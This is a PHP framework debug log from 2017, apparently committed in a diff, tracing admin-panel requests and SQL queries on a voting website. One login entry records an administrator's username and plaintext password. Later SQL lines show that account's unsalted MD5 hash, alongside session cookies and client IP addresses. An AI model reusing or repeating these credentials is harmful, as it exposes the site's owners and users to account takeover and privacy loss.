+[ sql ] [ SQL ] SELECT `role_id` FROM `zifi_admin_user` WHERE  (  admin_id=2 ) LIMIT 1 [ RunTime:0.000193s ]
+[ sql ] [ SQL ] SHOW COLUMNS FROM `zifi_admin_role` [ RunTime:0.000480s ]
+[ sql ] [ SQL ] SELECT `power` FROM `zifi_admin_role` WHERE  (  role_id=2 ) LIMIT 1 [ RunTime:0.000134s ]
+[ sql ] [ SQL ] SHOW COLUMNS FROM `zifi_admin_menu` [ RunTime:0.000481s ]
+[ sql ] [ SQL ] SELECT * FROM `zifi_admin_menu` WHERE  (  fid = 0 and shows = 1  ) ORDER BY sort desc [ RunTime:0.000170s ]
+[ sql ] [ SQL ] SELECT * FROM `zifi_admin_menu` WHERE  (  fid != 0 and shows = 1 and id in (68,69,11) ) ORDER BY sort desc [ RunTime:0.000171s ]
+[ sql ] [ SQL ] SHOW COLUMNS FROM `zifi_param` [ RunTime:0.000490s ]
+[ sql ] [ SQL ] SELECT * FROM `zifi_param` [ RunTime:0.000152s ]
+[ sql ] [ SQL ] SHOW COLUMNS FROM `zifi_user` [ RunTime:0.000487s ]
+[ sql ] [ SQL ] UPDATE `zifi_user`  SET `buy`=2  WHERE  `id` = 84 [ RunTime:0.000262s ]
+
+---------------------------------------------------------------
+[ 2017-09-24T08:29:53+08:00 ] 118.190.138.146 112.248.158.66 GET /index.php/admin/index/index.html
+[ log ] tez.lyzfrj.com/index.php/admin/index/index.html [运行时间：0.029744s][吞吐率：33.62req/s] [内存消耗：3,157.48kb] [文件加载：45]
+[ info ] [ LANG ] /www/wwwroot/tez.lyzfrj.com/thinkphp/lang/zh-cn.php
+[ info ] [ ROUTE ] array (
+  'type' => 'module',
+  'module' => 
+  array (
+    0 => 'admin',
+    1 => 'index',
+    2 => 'index',
+  ),
+)
+[ info ] [ HEADER ] array (
+  'accept' => 'text/html, application/xhtml+xml, image/jxr, */*',
+  'referer' => 'http://tez.lyzfrj.com/index.php/admin/login/login.html',
+  'accept-language' => 'zh-CN',
+  'user-agent' => 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2704.79 Safari/537.36 Edge/14.14393',
+  'accept-encoding' => 'gzip, deflate',
+  'host' => 'tez.lyzfrj.com',
+  'connection' => 'Keep-Alive',
+  'cookie' => 'PHPSESSID=t7k1sup2a9f10mlh2ugfl3dmt0',
+  'content-type' => '',
+  'content-length' => '',
+)
+[ info ] [ PARAM ] array (
+)
+[ info ] [ SESSION ] INIT array (
+  'id' => '',
+  'var_session_id' => '',
+  'prefix' => 'think',
+  'type' => '',
+  'auto_start' => true,
+)
+[ info ] [ DB ] INIT mysql
+[ info ] [ RUN ] app\admin\controller\Index->index[ /www/wwwroot/tez.lyzfrj.com/application/admin/controller/Index.php ]
+[ info ] [ VIEW ] /www/wwwroot/tez.lyzfrj.com/application/admin/view/index/index.html [ array (
+  0 => 'controller',
+  1 => 'action',
+  2 => 'list_menu',
+  3 => 'headArr',
+) ]
+[ info ] [ LOG ] INIT File
+[ sql ] [ DB ] CONNECT:[ UseTime:0.000350s ] mysql:dbname=tez_lyzfrj_com;host=127.0.0.1;charset=utf8
+[ sql ] [ SQL ] SHOW COLUMNS FROM `zifi_admin_user` [ RunTime:0.000716s ]
+[ sql ] [ SQL ] SELECT `role_id` FROM `zifi_admin_user` WHERE  (  admin_id=2 ) LIMIT 1 [ RunTime:0.000203s ]
+[ sql ] [ SQL ] SHOW COLUMNS FROM `zifi_admin_role` [ RunTime:0.000459s ]
+[ sql ] [ SQL ] SELECT `power` FROM `zifi_admin_role` WHERE  (  role_id=2 ) LIMIT 1 [ RunTime:0.000138s ]
+[ sql ] [ SQL ] SHOW COLUMNS FROM `zifi_admin_menu` [ RunTime:0.000467s ]
+[ sql ] [ SQL ] SELECT * FROM `zifi_admin_menu` WHERE  (  fid = 0 and shows = 1  ) ORDER BY sort desc [ RunTime:0.000165s ]
+[ sql ] [ SQL ] SELECT * FROM `zifi_admin_menu` WHERE  (  fid != 0 and shows = 1 and id in (68,69,11) ) ORDER BY sort desc [ RunTime:0.000178s ]
+[ sql ] [ SQL ] SHOW COLUMNS FROM `zifi_param` [ RunTime:0.000508s ]
+[ sql ] [ SQL ] SELECT * FROM `zifi_param` [ RunTime:0.000156s ]
+
+---------------------------------------------------------------
+[ 2017-09-24T08:29:53+08:00 ] 118.190.138.146 112.248.158.66 GET /index.php/admin/index/main.html
+[ log ] tez.lyzfrj.com/index.php/admin/index/main.html [运行时间：0.028339s][吞吐率：35.29req/s] [内存消耗：3,080.27kb] [文件加载：44]
+[ info ] [ LANG ] /www/wwwroot/tez.lyzfrj.com/thinkphp/lang/zh-cn.php
+[ info ] [ ROUTE ] array (
+  'type' => 'module',
+  'module' => 
+  array (
+    0 => 'admin',
+    1 => 'index',
+    2 => 'main',
+  ),
+)
+[ info ] [ HEADER ] array (
+  'accept' => 'text/html, application/xhtml+xml, image/jxr, */*',
+  'referer' => 'http://tez.lyzfrj.com/index.php/admin/index/index.html',
+  'accept-language' => 'zh-CN',
+  'user-agent' => 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2704.79 Safari/537.36 Edge/14.14393',
+  'accept-encoding' => 'gzip, deflate',
+  'host' => 'tez.lyzfrj.com',
+  'connection' => 'Keep-Alive',
+  'cookie' => 'PHPSESSID=t7k1sup2a9f10mlh2ugfl3dmt0',
+  'content-type' => '',
+  'content-length' => '',
+)
+[ info ] [ PARAM ] array (
+)
+[ info ] [ SESSION ] INIT array (
+  'id' => '',
+  'var_session_id' => '',
+  'prefix' => 'think',
+  'type' => '',
+  'auto_start' => true,
+)
+[ info ] [ DB ] INIT mysql
+[ info ] [ RUN ] app\admin\controller\Index->main[ /www/wwwroot/tez.lyzfrj.com/application/admin/controller/Index.php ]
+[ info ] [ VIEW ] /www/wwwroot/tez.lyzfrj.com/application/admin/view/index/main.html [ array (
+  0 => 'controller',
+  1 => 'action',
+  2 => 'list_menu',
+  3 => 'headArr',
+  4 => 'domain',
+) ]
+[ info ] [ LOG ] INIT File
+[ sql ] [ DB ] CONNECT:[ UseTime:0.000309s ] mysql:dbname=tez_lyzfrj_com;host=127.0.0.1;charset=utf8
+[ sql ] [ SQL ] SHOW COLUMNS FROM `zifi_admin_user` [ RunTime:0.000648s ]
+[ sql ] [ SQL ] SELECT `role_id` FROM `zifi_admin_user` WHERE  (  admin_id=2 ) LIMIT 1 [ RunTime:0.000184s ]
+[ sql ] [ SQL ] SHOW COLUMNS FROM `zifi_admin_role` [ RunTime:0.000501s ]
+[ sql ] [ SQL ] SELECT `power` FROM `zifi_admin_role` WHERE  (  role_id=2 ) LIMIT 1 [ RunTime:0.000133s ]
+[ sql ] [ SQL ] SHOW COLUMNS FROM `zifi_admin_menu` [ RunTime:0.000491s ]
+[ sql ] [ SQL ] SELECT * FROM `zifi_admin_menu` WHERE  (  fid = 0 and shows = 1  ) ORDER BY sort desc [ RunTime:0.000158s ]
+[ sql ] [ SQL ] SELECT * FROM `zifi_admin_menu` WHERE  (  fid != 0 and shows = 1 and id in (68,69,11) ) ORDER BY sort desc [ RunTime:0.000168s ]
+[ sql ] [ SQL ] SHOW COLUMNS FROM `zifi_param` [ RunTime:0.000486s ]
+[ sql ] [ SQL ] SELECT * FROM `zifi_param` [ RunTime:0.000170s ]
+
+---------------------------------------------------------------
+[ 2017-09-24T08:29:55+08:00 ] 118.190.138.146 112.248.158.66 GET /index.php/admin/vote/user_list.html
+[ log ] tez.lyzfrj.com/index.php/admin/vote/user_list.html [运行时间：0.033678s][吞吐率：29.69req/s] [内存消耗：3,426.27kb] [文件加载：48]
+[ info ] [ LANG ] /www/wwwroot/tez.lyzfrj.com/thinkphp/lang/zh-cn.php
+[ info ] [ ROUTE ] array (
+  'type' => 'module',
+  'module' => 
+  array (
+    0 => 'admin',
+    1 => 'vote',
+    2 => 'user_list',
+  ),
+)
+[ info ] [ HEADER ] array (
+  'accept' => 'text/html, application/xhtml+xml, image/jxr, */*',
+  'referer' => 'http://tez.lyzfrj.com/index.php/admin/index/index.html',
+  'accept-language' => 'zh-CN',
+  'user-agent' => 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2704.79 Safari/537.36 Edge/14.14393',
+  'accept-encoding' => 'gzip, deflate',
+  'host' => 'tez.lyzfrj.com',
+  'connection' => 'Keep-Alive',
+  'cookie' => 'PHPSESSID=t7k1sup2a9f10mlh2ugfl3dmt0',
+  'content-type' => '',
+  'content-length' => '',
+)
+[ info ] [ PARAM ] array (
+)
+[ info ] [ SESSION ] INIT array (
+  'id' => '',
+  'var_session_id' => '',
+  'prefix' => 'think',
+  'type' => '',
+  'auto_start' => true,
+)
+[ info ] [ DB ] INIT mysql
+[ info ] [ RUN ] app\admin\controller\Vote->user_list[ /www/wwwroot/tez.lyzfrj.com/application/admin/controller/Vote.php ]
+[ info ] [ VIEW ] /www/wwwroot/tez.lyzfrj.com/application/admin/view/vote/user_list.html [ array (
+  0 => 'controller',
+  1 => 'action',
+  2 => 'list_menu',
+  3 => 'headArr',
+  4 => 'list_data',
+  5 => 'keyword',
+  6 => 'ip',
+) ]
+[ info ] [ LOG ] INIT File
+[ sql ] [ DB ] CONNECT:[ UseTime:0.000383s ] mysql:dbname=tez_lyzfrj_com;host=127.0.0.1;charset=utf8
+[ sql ] [ SQL ] SHOW COLUMNS FROM `zifi_admin_user` [ RunTime:0.000749s ]
+[ sql ] [ SQL ] SELECT `role_id` FROM `zifi_admin_user` WHERE  (  admin_id=2 ) LIMIT 1 [ RunTime:0.000215s ]
+[ sql ] [ SQL ] SHOW COLUMNS FROM `zifi_admin_role` [ RunTime:0.000485s ]
+[ sql ] [ SQL ] SELECT `power` FROM `zifi_admin_role` WHERE  (  role_id=2 ) LIMIT 1 [ RunTime:0.000137s ]
+[ sql ] [ SQL ] SHOW COLUMNS FROM `zifi_admin_menu` [ RunTime:0.000498s ]
+[ sql ] [ SQL ] SELECT * FROM `zifi_admin_menu` WHERE  (  fid = 0 and shows = 1  ) ORDER BY sort desc [ RunTime:0.000168s ]
+[ sql ] [ SQL ] SELECT * FROM `zifi_admin_menu` WHERE  (  fid != 0 and shows = 1 and id in (68,69,11) ) ORDER BY sort desc [ RunTime:0.000186s ]
+[ sql ] [ SQL ] SHOW COLUMNS FROM `zifi_param` [ RunTime:0.000514s ]
+[ sql ] [ SQL ] SELECT * FROM `zifi_param` [ RunTime:0.000169s ]
+[ sql ] [ SQL ] SHOW COLUMNS FROM `zifi_user` [ RunTime:0.000522s ]
+[ sql ] [ SQL ] SELECT COUNT(*) AS tp_count FROM `zifi_user` LIMIT 1 [ RunTime:0.000217s ]
+[ sql ] [ SQL ] SELECT * FROM `zifi_user` ORDER BY add_time desc LIMIT 0,50 [ RunTime:0.000251s ]
+[ sql ] [ SQL ] SELECT COUNT(*) AS tp_count FROM `zifi_user` LIMIT 1 [ RunTime:0.000151s ]
+
+---------------------------------------------------------------
+[ 2017-09-24T10:21:03+08:00 ] 118.190.138.146 112.233.60.92 GET /index.php/admin/login/login.html
+[ log ] tez.lyzfrj.com/index.php/admin/login/login.html [运行时间：0.015257s][吞吐率：65.54req/s] [内存消耗：1,713.64kb] [文件加载：34]
+[ info ] [ LANG ] /www/wwwroot/tez.lyzfrj.com/thinkphp/lang/zh-cn.php
+[ info ] [ ROUTE ] array (
+  'type' => 'module',
+  'module' => 
+  array (
+    0 => 'admin',
+    1 => 'login',
+    2 => 'login',
+  ),
+)
+[ info ] [ HEADER ] array (
+  'host' => 'tez.lyzfrj.com',
+  'connection' => 'keep-alive',
+  'accept' => 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
+  'upgrade-insecure-requests' => '1',
+  'user-agent' => 'Mozilla/5.0 (Linux; U; Android 6.0;zh_cn; Letv X500 Build/DBXCNOP5902605181S) AppleWebKit/537.36 (KHTML, like Gecko)Version/4.0 Chrome/49.0.2623.91 Mobile Safari/537.36 EUI Browser/1.3.2.39',
+  'accept-encoding' => 'gzip, deflate',
+  'accept-language' => 'zh-CN,en-US;q=0.8',
+  'cookie' => 'PHPSESSID=47q49sml0e5gprvit1vt0d7bn0',
+  'x-requested-with' => 'com.android.browser',
+  'content-type' => '',
+  'content-length' => '',
+)
+[ info ] [ PARAM ] array (
+)
+[ info ] [ RUN ] app\admin\controller\Login->login[ /www/wwwroot/tez.lyzfrj.com/application/admin/controller/Login.php ]
+[ info ] [ VIEW ] /www/wwwroot/tez.lyzfrj.com/application/admin/view/login/login.html [ array (
+  0 => 'headArr',
+) ]
+[ info ] [ LOG ] INIT File
+
+---------------------------------------------------------------
+[ 2017-09-24T10:21:04+08:00 ] 118.190.138.146 112.233.60.92 GET /index.php/admin/common/verify.html
+[ log ] tez.lyzfrj.com/index.php/admin/common/verify.html [运行时间：0.014556s][吞吐率：68.70req/s] [内存消耗：1,461.72kb] [文件加载：28]
+[ info ] [ LANG ] /www/wwwroot/tez.lyzfrj.com/thinkphp/lang/zh-cn.php
+[ info ] [ ROUTE ] array (
+  'type' => 'module',
+  'module' => 
+  array (
+    0 => 'admin',
+    1 => 'common',
+    2 => 'verify',
+  ),
+)
+[ info ] [ HEADER ] array (
+  'host' => 'tez.lyzfrj.com',
+  'connection' => 'keep-alive',
+  'accept' => 'image/webp,image/*,*/*;q=0.8',
+  'user-agent' => 'Mozilla/5.0 (Linux; U; Android 6.0;zh_cn; Letv X500 Build/DBXCNOP5902605181S) AppleWebKit/537.36 (KHTML, like Gecko)Version/4.0 Chrome/49.0.2623.91 Mobile Safari/537.36 EUI Browser/1.3.2.39',
+  'referer' => 'http://tez.lyzfrj.com/index.php/admin/login/login.html',
+  'accept-encoding' => 'gzip, deflate',
+  'accept-language' => 'zh-CN,en-US;q=0.8',
+  'cookie' => 'PHPSESSID=47q49sml0e5gprvit1vt0d7bn0',
+  'x-requested-with' => 'com.android.browser',
+  'content-type' => '',
+  'content-length' => '',
+)
+[ info ] [ PARAM ] array (
+)
+[ info ] [ RUN ] app\admin\controller\Common->verify[ /www/wwwroot/tez.lyzfrj.com/application/admin/controller/Common.php ]
+[ info ] [ SESSION ] INIT array (
+  'id' => '',
+  'var_session_id' => '',
+  'prefix' => 'think',
+  'type' => '',
+  'auto_start' => true,
+)
+[ info ] [ LOG ] INIT File
+
+---------------------------------------------------------------
+[ 2017-09-24T10:22:11+08:00 ] 118.190.138.146 112.224.21.194 GET /index.php/admin/login/login.html
+[ log ] tez.lyzfrj.com/index.php/admin/login/login.html [运行时间：0.015230s][吞吐率：65.66req/s] [内存消耗：1,713.89kb] [文件加载：34]
+[ info ] [ LANG ] /www/wwwroot/tez.lyzfrj.com/thinkphp/lang/zh-cn.php
+[ info ] [ ROUTE ] array (
+  'type' => 'module',
+  'module' => 
+  array (
+    0 => 'admin',
+    1 => 'login',
+    2 => 'login',
+  ),
+)
+[ info ] [ HEADER ] array (
+  'host' => 'tez.lyzfrj.com',
+  'connection' => 'keep-alive',
+  'cache-control' => 'max-age=0',
+  'accept' => 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
+  'upgrade-insecure-requests' => '1',
+  'user-agent' => 'Mozilla/5.0 (Linux; U; Android 6.0;zh_cn; Letv X500 Build/DBXCNOP5902605181S) AppleWebKit/537.36 (KHTML, like Gecko)Version/4.0 Chrome/49.0.2623.91 Mobile Safari/537.36 EUI Browser/1.3.2.39',
+  'accept-encoding' => 'gzip, deflate',
+  'accept-language' => 'zh-CN,en-US;q=0.8',
+  'cookie' => 'PHPSESSID=47q49sml0e5gprvit1vt0d7bn0',
+  'x-requested-with' => 'com.android.browser',
+  'content-type' => '',
+  'content-length' => '',
+)
+[ info ] [ PARAM ] array (
+)
+[ info ] [ RUN ] app\admin\controller\Login->login[ /www/wwwroot/tez.lyzfrj.com/application/admin/controller/Login.php ]
+[ info ] [ VIEW ] /www/wwwroot/tez.lyzfrj.com/application/admin/view/login/login.html [ array (
+  0 => 'headArr',
+) ]
+[ info ] [ LOG ] INIT File
+
+---------------------------------------------------------------
+[ 2017-09-24T10:22:11+08:00 ] 118.190.138.146 112.224.21.194 GET /index.php/admin/common/verify.html
+[ log ] tez.lyzfrj.com/index.php/admin/common/verify.html [运行时间：0.013281s][吞吐率：75.29req/s] [内存消耗：1,462.06kb] [文件加载：28]
+[ info ] [ LANG ] /www/wwwroot/tez.lyzfrj.com/thinkphp/lang/zh-cn.php
+[ info ] [ ROUTE ] array (
+  'type' => 'module',
+  'module' => 
+  array (
+    0 => 'admin',
+    1 => 'common',
+    2 => 'verify',
+  ),
+)
+[ info ] [ HEADER ] array (
+  'host' => 'tez.lyzfrj.com',
+  'connection' => 'keep-alive',
+  'cache-control' => 'max-age=0',
+  'accept' => 'image/webp,image/*,*/*;q=0.8',
+  'user-agent' => 'Mozilla/5.0 (Linux; U; Android 6.0;zh_cn; Letv X500 Build/DBXCNOP5902605181S) AppleWebKit/537.36 (KHTML, like Gecko)Version/4.0 Chrome/49.0.2623.91 Mobile Safari/537.36 EUI Browser/1.3.2.39',
+  'referer' => 'http://tez.lyzfrj.com/index.php/admin/login/login.html',
+  'accept-encoding' => 'gzip, deflate',
+  'accept-language' => 'zh-CN,en-US;q=0.8',
+  'cookie' => 'PHPSESSID=47q49sml0e5gprvit1vt0d7bn0',
+  'x-requested-with' => 'com.android.browser',
+  'content-type' => '',
+  'content-length' => '',
+)
+[ info ] [ PARAM ] array (
+)
+[ info ] [ RUN ] app\admin\controller\Common->verify[ /www/wwwroot/tez.lyzfrj.com/application/admin/controller/Common.php ]
+[ info ] [ SESSION ] INIT array (
+  'id' => '',
+  'var_session_id' => '',
+  'prefix' => 'think',
+  'type' => '',
+  'auto_start' => true,
+)
+[ info ] [ LOG ] INIT File
+
+---------------------------------------------------------------
+[ 2017-09-24T10:22:35+08:00 ] 118.190.138.146 112.224.21.194 POST /index.php/admin/login/do_login.html
+[ log ] tez.lyzfrj.com/index.php/admin/login/do_login.html [运行时间：0.029992s][吞吐率：33.34req/s] [内存消耗：2,683.71kb] [文件加载：41]
+[ info ] [ LANG ] /www/wwwroot/tez.lyzfrj.com/thinkphp/lang/zh-cn.php
+[ info ] [ ROUTE ] array (
+  'type' => 'module',
+  'module' => 
+  array (
+    0 => 'admin',
+    1 => 'login',
+    2 => 'do_login',
+  ),
+)
+[ info ] [ HEADER ] array (
+  'host' => 'tez.lyzfrj.com',
+  'connection' => 'keep-alive',
+  'content-length' => '50',
+  'accept' => '*/*',
+  'origin' => 'http://tez.lyzfrj.com',
+  'x-requested-with' => 'XMLHttpRequest',
+  'user-agent' => 'Mozilla/5.0 (Linux; U; Android 6.0;zh_cn; Letv X500 Build/DBXCNOP5902605181S) AppleWebKit/537.36 (KHTML, like Gecko)Version/4.0 Chrome/49.0.2623.91 Mobile Safari/537.36 EUI Browser/1.3.2.39',
+  'content-type' => 'application/x-www-form-urlencoded; charset=UTF-8',
+  'referer' => 'http://tez.lyzfrj.com/index.php/admin/login/login.html',
+  'accept-encoding' => 'gzip, deflate',
+  'accept-language' => 'zh-CN,en-US;q=0.8',
+  'cookie' => 'PHPSESSID=47q49sml0e5gprvit1vt0d7bn0',
+)
+[ info ] [ PARAM ] array (
+  'username' => 'lishuai',
+  'password' => 'LiShuai3097920',
+  'code' => '4914',
+)
+[ info ] [ RUN ] app\admin\controller\Login->do_login[ /www/wwwroot/tez.lyzfrj.com/application/admin/controller/Login.php ]
+[ info ] [ SESSION ] INIT array (
+  'id' => '',
+  'var_session_id' => '',
+  'prefix' => 'think',
+  'type' => '',
+  'auto_start' => true,
+)
+[ info ] [ DB ] INIT mysql
+[ info ] [ LOG ] INIT File
+[ sql ] [ DB ] CONNECT:[ UseTime:0.000408s ] mysql:dbname=tez_lyzfrj_com;host=127.0.0.1;charset=utf8
+[ sql ] [ SQL ] SHOW COLUMNS FROM `zifi_admin_user` [ RunTime:0.000781s ]
+[ sql ] [ SQL ] SELECT * FROM `zifi_admin_user` WHERE  `username` = 'lishuai' LIMIT 1 [ RunTime:0.000358s ]
+[ sql ] [ SQL ] SELECT * FROM `zifi_admin_user` WHERE  `username` = 'lishuai'  AND `password` = '570582733c01e1bdd100f21266f02968' LIMIT 1 [ RunTime:0.000261s ]
+[ sql ] [ SQL ] SHOW COLUMNS FROM `zifi_admin_role` [ RunTime:0.000533s ]
+[ sql ] [ SQL ] SELECT * FROM `zifi_admin_role` WHERE  (  role_id = 1 ) LIMIT 1 [ RunTime:0.000143s ]
+[ sql ] [ SQL ] UPDATE `zifi_admin_user`  SET `last_login_ip`='112.224.21.194',`last_login_time`=1506219755  WHERE  `username` = 'lishuai'  AND `password` = '570582733c01e1bdd100f21266f02968' [ RunTime:0.003941s ]
+
+---------------------------------------------------------------
+[ 2017-09-24T10:22:36+08:00 ] 118.190.138.146 112.224.21.194 GET /index.php/admin/index/index.html
+[ log ] tez.lyzfrj.com/index.php/admin/index/index.html [运行时间：0.029828s][吞吐率：33.53req/s] [内存消耗：3,166.97kb] [文件加载：45]
+[ info ] [ LANG ] /www/wwwroot/tez.lyzfrj.com/thinkphp/lang/zh-cn.php
+[ info ] [ ROUTE ] array (
+  'type' => 'module',
+  'module' => 
+  array (
+    0 => 'admin',
+    1 => 'index',
+    2 => 'index',
+  ),
+)
+[ info ] [ HEADER ] array (
+  'host' => 'tez.lyzfrj.com',
+  'connection' => 'keep-alive',
+  'accept' => 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
+  'upgrade-insecure-requests' => '1',
+  'user-agent' => 'Mozilla/5.0 (Linux; U; Android 6.0;zh_cn; Letv X500 Build/DBXCNOP5902605181S) AppleWebKit/537.36 (KHTML, like Gecko)Version/4.0 Chrome/49.0.2623.91 Mobile Safari/537.36 EUI Browser/1.3.2.39',
+  'referer' => 'http://tez.lyzfrj.com/index.php/admin/login/login.html',
+  'accept-encoding' => 'gzip, deflate',
+  'accept-language' => 'zh-CN,en-US;q=0.8',
+  'cookie' => 'PHPSESSID=47q49sml0e5gprvit1vt0d7bn0',
+  'x-requested-with' => 'com.android.browser',
+  'content-type' => '',
+  'content-length' => '',
+)
+[ info ] [ PARAM ] array (
+)
+[ info ] [ SESSION ] INIT array (
+  'id' => '',
+  'var_session_id' => '',
+  'prefix' => 'think',
+  'type' => '',
+  'auto_start' => true,
+)
+[ info ] [ DB ] INIT mysql
+[ info ] [ RUN ] app\admin\controller\Index->index[ /www/wwwroot/tez.lyzfrj.com/application/admin/controller/Index.php ]
+[ info ] [ VIEW ] /www/wwwroot/tez.lyzfrj.com/application/admin/view/index/index.html [ array (
+  0 => 'controller',
+  1 => 'action',
+  2 => 'list_menu',
+  3 => 'headArr',
+) ]
+[ info ] [ LOG ] INIT File
+[ sql ] [ DB ] CONNECT:[ UseTime:0.000363s ] mysql:dbname=tez_lyzfrj_com;host=127.0.0.1;charset=utf8
+[ sql ] [ SQL ] SHOW COLUMNS FROM `zifi_admin_user` [ RunTime:0.000726s ]
+[ sql ] [ SQL ] SELECT `role_id` FROM `zifi_admin_user` WHERE  (  admin_id=3 ) LIMIT 1 [ RunTime:0.000286s ]
+[ sql ] [ SQL ] SHOW COLUMNS FROM `zifi_admin_role` [ RunTime:0.000462s ]
+[ sql ] [ SQL ] SELECT `power` FROM `zifi_admin_role` WHERE  (  role_id=1 ) LIMIT 1 [ RunTime:0.000144s ]
+[ sql ] [ SQL ] SHOW COLUMNS FROM `zifi_admin_menu` [ RunTime:0.000466s ]
+[ sql ] [ SQL ] SELECT * FROM `zifi_admin_menu` WHERE  (  fid = 0 and shows = 1  ) ORDER BY sort desc [ RunTime:0.000162s ]
+[ sql ] [ SQL ] SELECT * FROM `zifi_admin_menu` WHERE  (  fid != 0 and shows = 1 and id in (68,69,71,51,11,12,13,14) ) ORDER BY sort desc [ RunTime:0.000178s ]
+[ sql ] [ SQL ] SHOW COLUMNS FROM `zifi_param` [ RunTime:0.000506s ]
+[ sql ] [ SQL ] SELECT * FROM `zifi_param` [ RunTime:0.000154s ]
+
+---------------------------------------------------------------
+[ 2017-09-24T10:22:36+08:00 ] 118.190.138.146 112.224.21.194 GET /index.php/admin/index/main.html
+[ log ] tez.lyzfrj.com/index.php/admin/index/main.html [运行时间：0.028868s][吞吐率：34.64req/s] [内存消耗：3,089.55kb] [文件加载：44]
+[ info ] [ LANG ] /www/wwwroot/tez.lyzfrj.com/thinkphp/lang/zh-cn.php
+[ info ] [ ROUTE ] array (
+  'type' => 'module',
+  'module' => 
+  array (
+    0 => 'admin',
+    1 => 'index',
+    2 => 'main',
+  ),
+)
+[ info ] [ HEADER ] array (
+  'host' => 'tez.lyzfrj.com',
+  'connection' => 'keep-alive',
+  'accept' => 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
+  'upgrade-insecure-requests' => '1',
+  'user-agent' => 'Mozilla/5.0 (Linux; U; Android 6.0;zh_cn; Letv X500 Build/DBXCNOP5902605181S) AppleWebKit/537.36 (KHTML, like Gecko)Version/4.0 Chrome/49.0.2623.91 Mobile Safari/537.36 EUI Browser/1.3.2.39',
+  'referer' => 'http://tez.lyzfrj.com/index.php/admin/index/index.html',
+  'accept-encoding' => 'gzip, deflate',
+  'accept-language' => 'zh-CN,en-US;q=0.8',
+  'cookie' => 'PHPSESSID=47q49sml0e5gprvit1vt0d7bn0',
+  'x-requested-with' => 'com.android.browser',
+  'content-type' => '',
+  'content-length' => '',
+)
+[ info ] [ PARAM ] array (
+)
+[ info ] [ SESSION ] INIT array (
+  'id' => '',
+  'var_session_id' => '',
+  'prefix' => 'think',
+  'type' => '',
+  'auto_start' => true,
+)
+[ info ] [ DB ] INIT mysql
+[ info ] [ RUN ] app\admin\controller\Index->main[ /www/wwwroot/tez.lyzfrj.com/application/admin/controller/Index.php ]
+[ info ] [ VIEW ] /www/wwwroot/tez.lyzfrj.com/application/admin/view/index/main.html [ array (
+  0 => 'controller',
+  1 => 'action',
+  2 => 'list_menu',
+  3 => 'headArr',
+  4 => 'domain',
+) ]
+[ info ] [ LOG ] INIT File
+[ sql ] [ DB ] CONNECT:[ UseTime:0.000379s ] mysql:dbname=tez_lyzfrj_com;host=127.0.0.1;charset=utf8
+[ sql ] [ SQL ] SHOW COLUMNS FROM `zifi_admin_user` [ RunTime:0.000794s ]
+[ sql ] [ SQL ] SELECT `role_id` FROM `zifi_admin_user` WHERE  (  admin_id=3 ) LIMIT 1 [ RunTime:0.000209s ]
+[ sql ] [ SQL ] SHOW COLUMNS FROM `zifi_admin_role` [ RunTime:0.000480s ]
+[ sql ] [ SQL ] SELECT `power` FROM `zifi_admin_role` WHERE  (  role_id=1 ) LIMIT 1 [ RunTime:0.000148s ]
+[ sql ] [ SQL ] SHOW COLUMNS FROM `zifi_admin_menu` [ RunTime:0.000497s ]
+[ sql ] [ SQL ] SELECT * FROM `zifi_admin_menu` WHERE  (  fid = 0 and shows = 1  ) ORDER BY sort desc [ RunTime:0.000166s ]
+[ sql ] [ SQL ] SELECT * FROM `zifi_admin_menu` WHERE  (  fid != 0 and shows = 1 and id in (68,69,71,51,11,12,13,14) ) ORDER BY sort desc [ RunTime:0.000205s ]
+[ sql ] [ SQL ] SHOW COLUMNS FROM `zifi_param` [ RunTime:0.000534s ]
+[ sql ] [ SQL ] SELECT * FROM `zifi_param` [ RunTime:0.000157s ]
+
+---------------------------------------------------------------
+[ 2017-09-24T10:22:40+08:00 ] 118.190.138.146 112.224.21.194 GET /index.php/admin/vote/user_add.html
+[ log ] tez.lyzfrj.com/index.php/admin/vote/user_add.html [运行时间：0.030121s][吞吐率：33.20req/s] [内存消耗：3,275.41kb] [文件加载：45]
+[ info ] [ LANG ] /www/wwwroot/tez.lyzfrj.com/thinkphp/lang/zh-cn.php
+[ info ] [ ROUTE ] array (
+  'type' => 'module',
+  'module' => 
+  array (
+    0 => 'admin',
+    1 => 'vote',
+    2 => 'user_add',
+  ),
+)
+[ info ] [ HEADER ] array (
+  'host' => 'tez.lyzfrj.com',
+  'connection' => 'keep-alive',
+  'accept' => 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
+  'upgrade-insecure-requests' => '1',
+  'user-agent' => 'Mozilla/5.0 (Linux; U; Android 6.0;zh_cn; Letv X500 Build/DBXCNOP5902605181S) AppleWebKit/537.36 (KHTML, like Gecko)Version/4.0 Chrome/49.0.2623.91 Mobile Safari/537.36 EUI Browser/1.3.2.39',
+  'referer' => 'http://tez.lyzfrj.com/index.php/admin/index/index.html',
+  'accept-encoding' => 'gzip, deflate',
+  'accept-language' => 'zh-CN,en-US;q=0.8',
+  'cookie' => 'PHPSESSID=47q49sml0e5gprvit1vt0d7bn0',
+  'x-requested-with' => 'com.android.browser',
+  'content-type' => '',
+  'content-length' => '',
+)
+[ info ] [ PARAM ] array (
+)
+[ info ] [ SESSION ] INIT array (
+  'id' => '',
+  'var_session_id' => '',
+  'prefix' => 'think',
+  'type' => '',
+  'auto_start' => true,
+)
+[ info ] [ DB ] INIT mysql
+[ info ] [ RUN ] app\admin\controller\Vote->user_add[ /www/wwwroot/tez.lyzfrj.com/application/admin/controller/Vote.php ]
+[ info ] [ VIEW ] /www/wwwroot/tez.lyzfrj.com/application/admin/view/vote/user_add.html [ array (
+  0 => 'controller',
+  1 => 'action',
+  2 => 'list_menu',
+  3 => 'headArr',
+) ]
+[ info ] [ LOG ] INIT File
+[ sql ] [ DB ] CONNECT:[ UseTime:0.000389s ] mysql:dbname=tez_lyzfrj_com;host=127.0.0.1;charset=utf8
